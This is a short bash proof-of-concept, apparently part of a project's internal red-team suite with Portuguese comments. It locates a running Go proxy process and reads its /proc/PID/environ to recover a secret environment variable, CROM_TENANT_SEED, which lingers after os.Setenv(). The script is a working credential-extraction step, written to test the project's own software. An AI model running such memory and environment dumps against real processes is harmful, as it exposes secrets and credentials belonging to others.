#!/bin/bash
# PoC 01: Environ Leak Memory Extraction
# Explora limitação do Go onde os.Setenv() não altera o ponteiro POSIX.
set -e

echo "[☠️ Red Team PoC] Hunting for /proc/PID/environ leak..."
PID=$(pgrep -f "proxy_universal_out" || true)

if [ -z "$PID" ]; then
    echo "[-] Proxy not running. Start it first: CROM_TENANT_SEED=MY_SUPER_SECRET go run simulators/dropin_tcp/proxy_universal_out.go &"
    exit 1
fi

echo "[+] Target found, PID: $PID"
echo "[+] Dumping /proc/$PID/environ ..."

# A saída será redirecionada pelo framework do Red Team
strings /proc/$PID/environ | grep CROM_TENANT_SEED || echo "[-] Target patched, var not found."

echo "[+] Done."
